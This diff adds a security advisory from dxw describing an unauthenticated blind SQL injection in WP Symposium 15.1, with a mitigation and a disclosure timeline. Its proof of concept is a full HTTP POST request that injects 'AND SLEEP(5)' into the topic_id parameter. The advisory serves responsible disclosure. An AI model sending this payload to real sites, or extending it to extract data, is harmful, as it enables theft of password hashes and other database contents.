@@ -1,0 +1,62 @@
+Details
+================
+Software: WP Symposium
+Version: 15.1
+Homepage: https://wordpress.org/plugins/wp-symposium
+Advisory report: https://security.dxw.com/advisories/blind-sql-injection-in-wp-symposium-allows-unauthenticated-attackers-to-access-sensitive-data/
+CVE: Awaiting assignment
+CVSS: 6.4 (Medium; AV:N/AC:L/Au:N/C:P/I:N/A:P)
+
+Description
+================
+Blind SQL Injection in WP Symposium allows unauthenticated attackers to access sensitive data
+
+Vulnerability
+================
+An unauthenticated user can run blind sql injection of the site and extract password hashes and other information from the database.
+
+Proof of concept
+================
+Perform the following POST to a site with the plugin installed. The request will take over 5 seconds to respond:
+POST /wordpress/wp-content/plugins/wp-symposium/ajax/forum_functions.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://127.0.0.1/wordpress/
+Content-Length: 51
+Cookie: wp-settings-1=libraryContent%3Dbrowse%26editor%3Dtinymce; wp-settings-time-1=1421717320
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+action=getTopic&topic_id=1 AND SLEEP(5)&group_id=0
+ 
+
+Mitigations
+================
+Upgrade to version 15.8 or later
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+2015-03-02: Discovered
+2015-07-14: Reported to simon@wpsymposium.com
+2015-07-14: Requested CVE
+2015-08-07: Vendor confirmed fixed in version 15.8
+2015-08-10: Published
+
+
+Discovered by dxw:
+================
+Glyn Wintle
+Please visit security.dxw.com for more information.
